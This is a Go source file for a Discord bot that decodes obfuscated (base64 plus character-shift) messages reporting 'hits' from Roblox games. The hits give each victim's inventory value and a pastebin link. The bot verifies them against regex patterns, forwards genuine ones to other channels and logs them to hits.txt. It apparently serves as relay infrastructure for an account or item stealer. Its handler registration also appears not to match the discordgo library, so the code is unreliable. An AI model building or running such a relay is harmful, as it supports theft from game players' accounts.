package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"regexp"
	"strings"

	"github.com/bwmarrin/discordgo"
)

// Constants
const SOURCE_CHANNEL_ID = "1319759650903560315"
var TARGET_CHANNEL_IDS = []string{"1319759777730920539"}

// De-obfuscates the string by shifting characters
func shift(inputString string, shift int) string {
	var deobfuscatedString strings.Builder
	for _, char := range inputString {
		deobfuscatedChar := rune(int(char) - shift)
		deobfuscatedString.WriteRune(deobfuscatedChar)
	}
	return deobfuscatedString.String()
}

// Base64 decoding function
func base64Decode(encodedData string) (string, error) {
	decodedBytes, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		return "", err
	}
	return string(decodedBytes), nil
}

// Verifies the string based on patterns
func verifyString(s string) bool {
	decodedString, err := base64Decode(s)
	if err != nil {
		return false
	}

	// Apply shift to decode the message
	decodedString = shift(decodedString, 2)

	// Remove last line (as in the original JavaScript code)
	lines := strings.Split(decodedString, "\n")
	if len(lines) > 0 {
		lines = lines[:len(lines)-1] // Remove last line
	}
	decodedString = strings.Join(lines, "\n")

	// Define the regex patterns
	pattern1 := `^Adopt Me\nTotal Value: (-?\d+(\.\d+)?)\nInventory List: (https?:\/\/pastebin\.com[^\s]+|Error)$`
	pattern2 := `^Murder Mystery 2\nTotal Value: (-?\d+(\.\d+)?)\nInventory List: (https?:\/\/pastebin\.com[^\s]+|Error)$`
	pattern3 := `^Blade Ball\nTotal Value: (-?\d+(\.\d+)?)\nInventory List: (https?:\/\/pastebin\.com[^\s]+|Error)$`

	// Check if the message matches any of the patterns
	matched, _ := regexp.MatchString(pattern1, decodedString)
	if matched {
		return true
	}
	matched, _ = regexp.MatchString(pattern2, decodedString)
	if matched {
		return true
	}
	matched, _ = regexp.MatchString(pattern3, decodedString)
	return matched
}

// Extracts and de-obfuscates the message content
func getNewMessage(s string) (string, error) {
	decodedString, err := base64Decode(s)
	if err != nil {
		return "", err
	}

	// Apply shift to decode the message
	decodedString = shift(decodedString, 2)

	// Remove last line (as in the original JavaScript code)
	lines := strings.Split(decodedString, "\n")
	if len(lines) > 0 {
		lines = lines[:len(lines)-1] // Remove last line
	}
	return strings.Join(lines, "\n"), nil
}

// Handle incoming messages
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Skip bot messages
	if m.Author.Bot {
		return
	}

	// Check if the message is from the source channel
	if m.ChannelID == SOURCE_CHANNEL_ID {
		var shouldForward bool

		// If the message mentions users, do not forward
		if len(m.Mentions) > 0 {
			return
		}

		// If the message contains embeds, do not forward
		if len(m.Embeds) > 0 {
			return
		}

		// Verify the string
		if verifyString(m.Content) {
			shouldForward = true
		}

		// If the message should be forwarded
		if shouldForward {
			// Decode and de-obfuscate the message
			newMessage, err := getNewMessage(m.Content)
			if err != nil {
				log.Printf("Error decoding message: %v", err)
				return
			}

			// Send to target channels
			for _, targetChannelID := range TARGET_CHANNEL_IDS {
				_, err := s.ChannelMessageSend(targetChannelID, newMessage)
				if err != nil {
					log.Printf("Error sending to channel %s: %v", targetChannelID, err)
					continue
				}
				log.Printf("Sent to %s", targetChannelID)

				// Log the forwarded message to a file
				logMessageToFile(newMessage)
			}
		} else {
			log.Println("Fake hit detected")
		}
	}
}

// Log forwarded messages to a file
func logMessageToFile(message string) {
	file, err := os.OpenFile("hits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error opening file: %v", err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(message + "\n")
	if err != nil {
		log.Printf("Error writing to file: %v", err)
	}
}

func main() {
	// Set your Discord bot token here
	token := "YOUR_DISCORD_BOT_TOKEN" // Replace with your actual token

	// Create a new Discord session using the provided bot token
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// Register messageCreate as the handler for the messageCreate event
	dg.AddMessageCreate(messageCreate)

	// Open a connection to Discord
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait for the bot to close
	fmt.Println("Bot is now running. Press CTRL+C to exit.")
	select {}
}
